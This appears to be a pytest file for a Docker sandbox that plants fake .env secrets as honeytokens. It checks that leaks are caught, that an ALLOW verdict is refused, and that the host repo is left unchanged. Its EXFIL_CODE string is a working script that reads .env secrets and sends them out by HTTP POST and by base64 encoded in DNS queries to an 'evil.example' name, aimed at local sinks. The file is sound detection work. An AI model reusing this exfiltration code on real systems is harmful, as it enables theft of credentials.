"""Docker gate for honeytokens: planting must not disturb the scan, and a decoy
that leaks a planted value must produce a HoneytokenHit that forbids ALLOW."""

import hashlib
from pathlib import Path

import docker
import pytest
from pydantic import ValidationError

from run.evidence import RunComponents, State, VerdictReport
from run.llm import LLMReply, ToolCall
from run.sandbox import SCAN_LABEL, Sandbox, SandboxConfig, detonate

pytestmark = pytest.mark.docker
PYTHON_IMAGE = "python:3.12-alpine"


@pytest.fixture
def engine():
    client = docker.from_env(timeout=5)
    try:
        client.ping()
        for image in ("alpine:3.20", PYTHON_IMAGE):
            client.images.get(image)
        yield client
    finally:
        client.close()


def assert_no_leftovers(engine, evidence) -> None:
    assert not engine.containers.list(
        all=True, filters={"label": f"{SCAN_LABEL}={evidence.scan_id}"}
    )
    assert not engine.networks.list(filters={"label": f"{SCAN_LABEL}={evidence.scan_id}"})


def assert_cannot_be_allow(evidence) -> None:
    forced = evidence.model_copy(
        update={
            "status": "complete",
            "components": RunComponents(
                **{key: State.COMPLETE for key in RunComponents.model_fields}
            ),
        }
    )
    with pytest.raises(ValidationError, match="ALLOW requires"):
        VerdictReport(verdict="ALLOW", reason="bad", read={"status": "complete"}, run=forced)


def _tree_digest(root: Path) -> str:
    digest = hashlib.sha256()
    for path in sorted(root.rglob("*")):
        digest.update(path.relative_to(root).as_posix().encode())
        if path.is_symlink():
            digest.update(b"|" + str(path.readlink()).encode())
        elif path.is_file():
            digest.update(b"|" + path.read_bytes())
    return digest.hexdigest()


def test_planted_files_are_not_file_diffs_and_the_host_repo_is_untouched(repo: Path, engine):
    before = _tree_digest(repo)
    evidence = detonate(repo, ["true"], config=SandboxConfig(image=PYTHON_IMAGE))
    assert not evidence.errors, [error.model_dump_json() for error in evidence.errors]
    assert evidence.file_diffs == []
    assert evidence.honeytoken_hits == []
    assert evidence.status == "incomplete"
    assert _tree_digest(repo) == before
    assert not (repo / ".env").exists()
    assert not (repo / ".env.local").exists()
    assert not (repo / "config").exists()
    assert_no_leftovers(engine, evidence)


EXFIL_CODE = r"""
import base64, http.client, pathlib, socket, sys
dns_ip, http_ip = sys.argv[1], sys.argv[2]

def value(path, key):
    for line in pathlib.Path(path).read_text().splitlines():
        line = line.strip()
        if line.startswith(key + "="):
            return line.split("=", 1)[1]
    raise AssertionError(f"{key} not found in {path}")

plain = value("/repo/.env", "API_KEY")
hidden = value("/repo/.env.local", "DATABASE_PASSWORD")
conn = http.client.HTTPConnection(http_ip, 80, timeout=5)
conn.request("POST", "/collect", body=f"leak={plain}")
assert conn.getresponse().status == 200
conn.close()
label = base64.b64encode(hidden.encode()).decode()
name = ".".join([label[:32], label[32:], "exfil", "evil", "example"])
query = bytes.fromhex("abcd01000001000000000000")
for part in name.split("."):
    query += bytes([len(part)]) + part.encode()
query += b"\x00\x00\x01\x00\x01"
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.settimeout(5)
    sock.sendto(query, (dns_ip, 53))
    sock.recvfrom(4096)
print("EXFIL_DONE")
"""


def planted_entries(sandbox, path: str) -> dict[str, str]:
    lines = (sandbox.staged_path / path).read_text().splitlines()
    return {
        line.split("=", 1)[0]: line.split("=", 1)[1]
        for line in lines
        if "=" in line and not line.startswith("#")
    }


def test_leaked_planted_tokens_are_detected_and_forbid_allow(repo: Path, engine):
    before = _tree_digest(repo)
    sandbox = Sandbox(repo, SandboxConfig(image=PYTHON_IMAGE))
    with sandbox:
        sandbox.start_sinks()
        assert sandbox.trace_before()
        result = sandbox.run_command(["python", "-c", EXFIL_CODE, sandbox.dns_ip, sandbox.http_ip])
        assert result.exit_code == 0, result.model_dump_json()
        assert result.stdout == "EXFIL_DONE\n"
        sandbox.collect_sinks()
        sandbox.trace_after()
        id_by_value = {token.value: token.token_id for token in sandbox.honeytokens}
        plain_id = id_by_value[planted_entries(sandbox, ".env")["API_KEY"]]
        hidden_id = id_by_value[planted_entries(sandbox, ".env.local")["DATABASE_PASSWORD"]]
    evidence = sandbox.evidence
    assert not evidence.errors, [error.model_dump_json() for error in evidence.errors]
    hits = {(hit.token_id, hit.source) for hit in evidence.honeytoken_hits}
    assert (plain_id, "http") in hits
    assert (hidden_id, "dns") in hits
    for hit in evidence.honeytoken_hits:
        assert hit.source_ip == sandbox.cage_ip
    assert len(evidence.honeytoken_hits) == 2
    assert evidence.file_diffs == []
    assert evidence.status == "incomplete"
    assert_cannot_be_allow(evidence)
    assert _tree_digest(repo) == before
    assert_no_leftovers(engine, evidence)


class Scripted:
    """Minimal scripted backend; deliberately independent of run.llm."""

    def __init__(self, steps: list[tuple[str, dict]]):
        self.steps = list(steps)
        self.count = 0

    def chat(self, messages, tools):
        if not self.steps:
            return LLMReply(text="done")
        name, arguments = self.steps.pop(0)
        self.count += 1
        return LLMReply(
            tool_calls=[ToolCall(id=f"call-{self.count}", name=name, arguments=arguments)]
        )


def test_a_decoy_that_reads_the_planted_env_is_a_tool_log_hit(repo: Path, engine):
    evidence = detonate(
        repo,
        config=SandboxConfig(image=PYTHON_IMAGE, decoy_seconds=90),
        backend=Scripted([("read_file", {"path": ".env"})]),
    )
    assert not evidence.errors, [error.model_dump_json() for error in evidence.errors]
    read = evidence.tool_log[-1]
    assert read.command == ["read_file", ".env"]
    assert "BAITWATCH_FAKE_" in read.stdout
    hits = evidence.honeytoken_hits
    assert len(hits) == 2
    assert {hit.source for hit in hits} == {"tool_log"}
    assert len({hit.token_id for hit in hits}) == 2
    assert all(hit.source_ip is None for hit in hits)
    assert not evidence.dns_hits and not evidence.http_hits and not evidence.tls_hits
    # Honeytoken hits never upgrade the status; the verdict guard still refuses ALLOW.
    assert evidence.status == "complete"
    with pytest.raises(ValidationError, match="ALLOW requires"):
        VerdictReport(verdict="ALLOW", reason="bad", read={"status": "complete"}, run=evidence)
    assert (repo / ".env").exists() is False
    assert_no_leftovers(engine, evidence)
